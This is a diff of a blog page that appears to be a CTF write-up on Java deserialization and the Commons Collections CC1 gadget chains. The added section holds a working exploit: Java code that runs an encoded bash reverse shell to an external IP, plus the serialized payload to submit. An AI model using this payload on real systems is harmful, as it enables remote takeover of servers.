@@ -290,9 +290,9 @@
       <ol>
         <li><a href="#cc1链-利用transformedmap">CC1链-利用TransformedMap：</a></li>
         <li><a href="#入口类transformer类">入口类：Transformer类</a></li>
-        <li><a href="#a第一站寻找某个类中的某个方法调用了transform方法">A.第一站(寻找某个类中的某个方法调用了transform方法)</a></li>
-        <li><a href="#b第二站寻找合适的调用了checksetvalue的方法">B.第二站(寻找合适的调用了checkSetValue的方法)</a></li>
-        <li><a href="#c第三站追寻setvalue">C.第三站(追寻setValue)</a></li>
+        <li><a href="#1decorate实例化transformedmap从而可调用checksetvalue去调用transform方法">1.decorate实例化TransformedMap，从而可调用checkSetValue去调用transform方法，</a></li>
+        <li><a href="#b通过map遍历可以调用setvalue方法从而调用checksetvalue方法">B.通过Map遍历，可以调用setValue方法,从而调用checkSetValue方法:</a></li>
+        <li><a href="#c通过反射调用annotationinvocationhandler中的setvalue">C.通过反射调用AnnotationInvocationHandler中的setValue</a></li>
         <li><a href="#问题一解决runtimegetruntime对象不可被序列化">问题一：解决Runtime.getRuntime()对象不可被序列化</a></li>
         <li><a href="#问题二解决关于两个if的问题">问题二：解决关于两个if的问题</a></li>
         <li><a href="#问题三解决setvalue里的value不可控的问题">问题三：解决setValue里的value不可控的问题</a></li>
@@ -301,7 +301,12 @@
     <li><a href="#cc1链-利用lazymapget方法">CC1链-利用LazyMap.get方法：</a>
       <ol>
         <li><a href="#调用链">调用链：</a></li>
-        <li><a href="#构造poc">构造poc</a></li>
+        <li><a href="#构造poc">构造poc</a>
+          <ol>
+            <li><a href="#1将chainedtransformer传入并通过decorate方法获取到lazymap对象">1.将ChainedTransformer传入并通过decorate()方法获取到LazyMap对象</a></li>
+            <li><a href="#2通过动态代理lazymap调用任意方法entryset从而调用invocationhandler对象的invoke">2.通过动态代理lazymap调用任意方法（entrySet()）从而调用InvocationHandler对象的<code>invoke()</code></a></li>
+          </ol>
+        </li>
       </ol>
     </li>
   </ol>
@@ -372,7 +377,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 22 分钟
+                    阅读时长: 23 分钟
                 </time>
             </div>
         
@@ -1007,7 +1012,7 @@
 </div>
 </div><img src="image-20250716214656825.png" alt="image-20250716214656825" style="zoom:50%;" />
 <p>这个类是我们链子的终点，接下来就接着往上找了，直到到达重写了readObject的类</p>
-<h3 id="a第一站寻找某个类中的某个方法调用了transform方法">A.第一站(寻找某个类中的某个方法调用了transform方法)
+<h3 id="1decorate实例化transformedmap从而可调用checksetvalue去调用transform方法">1.decorate实例化TransformedMap，从而可调用checkSetValue去调用transform方法，
 </h3><p>右键查找方法的调用</p>
 <img src="image-20250716221524167.png" alt="image-20250716221524167" style="zoom:50%;" />
 <p>这里直接看到我们需要的TransformedMap类下的checkSetValue方法</p>
@@ -1081,7 +1086,7 @@
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>我们调用这个方法，然后实例化这个类，然后接下来想办法调用checkSetValue方法</p>
-<h3 id="b第二站寻找合适的调用了checksetvalue的方法">B.第二站(寻找合适的调用了checkSetValue的方法)
+<h3 id="b通过map遍历可以调用setvalue方法从而调用checksetvalue方法">B.通过Map遍历，可以调用setValue方法,从而调用checkSetValue方法:
 </h3><p><img src="/p/2025-ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96_846-858/image-20250717105254186.png"
 	width="1764"
 	height="931"
@@ -1236,7 +1241,7 @@
 		data-flex-basis="522px"
 	
 ></p>
-<h3 id="c第三站追寻setvalue">C.第三站(追寻setValue)
+<h3 id="c通过反射调用annotationinvocationhandler中的setvalue">C.通过反射调用AnnotationInvocationHandler中的setValue
 </h3><p>接下来看看哪个方法调用了setValue。在<strong>AnnotationInvocationHandler</strong>这个类中看到有个调用了<strong>setValue</strong>方法的<strong>readObject</strong>方法</p>
 <p><img src="/p/2025-ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96_846-858/image-20250718225201193.png"
 	width="1720"
@@ -1852,7 +1857,8 @@
 </span></span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="构造poc">构造poc
-</h3><p>从LazyMap的get()方法中可以看到，通过<code>factory.transform(key)</code>方式调用了<code>transform()</code>，所以根据CC1链的第一条，只需要控制<code>factory</code>为<code>chainedTransformer</code>即可。</p>
+</h3><h4 id="1将chainedtransformer传入并通过decorate方法获取到lazymap对象">1.将ChainedTransformer传入并通过decorate()方法获取到LazyMap对象
+</h4><p>从LazyMap的get()方法中可以看到，通过<code>factory.transform(key)</code>方式调用了<code>transform()</code>，所以根据CC1链的第一条，只需要控制<code>factory</code>为<code>chainedTransformer</code>即可。</p>
 <img src="image-20250724215809661.png" alt="image-20250724215809661" style="zoom:50%;" />
 <p><code>factory</code>是在LazyMap的构造函数中赋值</p>
 <img src="image-20250724215857462.png" alt="image-20250724215857462" style="zoom:50%;" />
@@ -1962,7 +1968,8 @@
 		data-flex-basis="932px"
 	
 ></p>
-<p>前面说到**这个<code>AnnotationInvocationHandler</code>的<code>invoke()</code>方法。**调用了get函数。</p>
+<h4 id="2通过动态代理lazymap调用任意方法entryset从而调用invocationhandler对象的invoke">2.通过动态代理lazymap调用任意方法（entrySet()）从而调用InvocationHandler对象的<code>invoke()</code>
+</h4><p>前面说到**这个<code>AnnotationInvocationHandler</code>的<code>invoke()</code>方法。**调用了get函数。</p>
 <p><strong>而这里的调用，是通过<code>memberValues</code>来进行调用，我们需要保证<code>memberValues</code>是<code>lazyMap</code>，这样的话，执行该<code>invoke()</code>方法时才会调用到<code>lazyMap</code>的<code>get()</code>方法。</strong></p>
 <img src="image-20250729203035523.png" alt="image-20250729203035523" style="zoom: 50%;" />
 <p>跟踪一下发现<code>memberValues</code>是通过<code>AnnotationInvocationHandler</code>的构造函数传入</p>
@@ -2276,7 +2283,138 @@
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
 </span></span></span></code></pre></td></tr></table>
 </div>
+</div><p><a class="link" href="https://www.cnblogs.com/leyilea/p/18426165"  target="_blank" rel="noopener"
+    >Java反序列化利用链篇 | CC1链的第二种方式-LazyMap版调用链【本系列文章的分析重点】 - leyilea - 博客园</a></p>
+<p><img src="/p/2025-ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96_846-858/image-20250810201210169.png"
+	width="1877"
+	height="401"
+	srcset="/p/2025-ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96_846-858/image-20250810201210169_hu_e03d06f30ae3026f.png 480w, /p/2025-ctfshow-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96_846-858/image-20250810201210169_hu_8de33a74c4317dd0.png 1024w"
+	loading="lazy"
+	
+		alt="image-20250810201210169"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="468"
+		data-flex-basis="1123px"
+	
+></p>
+<p>现在可以来解决ctfshow-847&ndash;打cc1第一条链</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">org.example</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.Transformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ChainedTransformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.ConstantTransformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.functors.InvokerTransformer</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.commons.collections.map.TransformedMap</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.*</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.annotation.Target</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Constructor</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.HashMap</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Map</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.util.Base64</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">cc1_2</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="w"> </span><span class="n">rc</span><span class="o">=</span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;java.lang.Runtime&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Transformer</span><span class="o">[]</span><span class="w"> </span><span class="n">Transformers</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">),</span><span class="w"> </span><span class="c1">//添加此行代码，这里解决问题三</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getDeclaredMethod&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Class</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span><span class="kc">null</span><span class="p">}),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;invoke&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Object</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="kc">null</span><span class="p">,</span><span class="kc">null</span><span class="p">}),</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDEuMjAwLjM5LjE5My81MDAwIDA+JjE=}|{base64,-d}|{bash,-i}&#34;</span><span class="p">})</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">};</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ChainedTransformer</span><span class="w"> </span><span class="n">chainedTransformer</span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ChainedTransformer</span><span class="p">(</span><span class="n">Transformers</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//上述利用反射获取类原型+transformer数组＋chainedtransformer遍历实现transform方法，来解决问题一中的无法序列化问题。</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">HashMap</span><span class="o">&lt;</span><span class="n">Object</span><span class="p">,</span><span class="n">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="n">map</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">HashMap</span><span class="o">&lt;&gt;</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">map</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;value&#34;</span><span class="p">,</span><span class="s">&#34;gxngxngxn&#34;</span><span class="p">);</span><span class="w"> </span><span class="c1">//这里是问题二中改键值对的值为注解中成员变量的名称，通过if判断</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Map</span><span class="o">&lt;</span><span class="n">Object</span><span class="p">,</span><span class="n">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="n">transformedmap</span><span class="o">=</span><span class="n">TransformedMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">map</span><span class="p">,</span><span class="kc">null</span><span class="p">,</span><span class="n">chainedTransformer</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Class</span><span class="w"> </span><span class="n">c</span><span class="o">=</span><span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Constructor</span><span class="w"> </span><span class="n">constructor</span><span class="o">=</span><span class="n">c</span><span class="p">.</span><span class="na">getDeclaredConstructor</span><span class="p">(</span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">Map</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">constructor</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">o</span><span class="o">=</span><span class="n">constructor</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">Target</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="n">transformedmap</span><span class="p">);</span><span class="w"> </span><span class="c1">//这里是问题二中第一个参数改注解为Target</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">serialize</span><span class="p">(</span><span class="n">o</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">serialize</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 创建字节输出流，用于存储序列化后的数据</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ByteArrayOutputStream</span><span class="w"> </span><span class="n">data</span><span class="w"> </span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">ByteArrayOutputStream</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 创建对象输出流，负责把对象写入字节流</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ObjectOutput</span><span class="w"> </span><span class="n">oos</span><span class="w"> </span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">data</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">obj</span><span class="p">);</span><span class="w"> </span><span class="c1">// 序列化对象</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">flush</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">oos</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// 用Base64编码输出序列化后的字节数据</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">Base64</span><span class="p">.</span><span class="na">getEncoder</span><span class="p">().</span><span class="na">encodeToString</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="na">toByteArray</span><span class="p">()));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
 </div>
+</div><p>然后post提交即可</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ctfshow=rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzcgAxb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5UcmFuc2Zvcm1lZE1hcGF3P+Bd8VpwAwACTAAOa2V5VHJhbnNmb3JtZXJ0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO0wAEHZhbHVlVHJhbnNmb3JtZXJxAH4ABXhwcHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAARzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXB0ABFnZXREZWNsYXJlZE1ldGhvZHVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAnZyABBqYXZhLmxhbmcuU3RyaW5noPCkOHo7s0ICAAB4cHZxAH4AGnNxAH4AEXVxAH4AFgAAAAJwcHQABmludm9rZXVxAH4AGgAAAAJ2cgAQamF2YS5sYW5nLk9iamVjdAAAAAAAAAAAAAAAeHB2cQB+ABZzcQB+ABF1cQB+ABYAAAABdABhYmFzaCAtYyB7ZWNobyxZbUZ6YUNBdGFTQStKaUF2WkdWMkwzUmpjQzh4TURFdU1qQXdMak01TGpFNU15ODFNREF3SURBK0pqRT19fHtiYXNlNjQsLWR9fHtiYXNoLC1pfXQABGV4ZWN1cQB+ABoAAAABcQB+AB1zcgARamF2YS51dGlsLkhhc2hNYXAFB9rBwxZg0QMAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAMdwgAAAAQAAAAAXQABXZhbHVldAAJZ3huZ3huZ3hueHh2cgAbamF2YS5sYW5nLmFubm90YXRpb24uVGFyZ2V0AAAAAAAAAAAAAAB4cA==
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20250810200335689.png" alt="image-20250810200335689" style="zoom:50%;" />
+
 </section>
 
 
@@ -2318,6 +2456,32 @@
             
                 
 <article class="">
+    <a href="/p/2023-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2023-极客大挑战</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/2025-%E7%AC%AC%E5%8D%81%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9Fctf/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">2025-第十届上海大学生ctf</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
     <a href="/p/2025-swpu-nssctf/">
         
         
@@ -2350,32 +2514,6 @@
 
         <div class="article-details">
             <h2 class="article-title">2025-Nepctf</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="">
-    <a href="/p/2025-7%E6%9C%88%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">2025-7月每日一题</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="">
-    <a href="/p/2025%E5%A4%8F%E5%AD%A3%E6%98%A5%E7%A7%8B%E6%9D%AF/">
-        
-        
-
-        <div class="article-details">
-            <h2 class="article-title">2025夏季春秋杯</h2>
         </div>
     </a>
 </article>
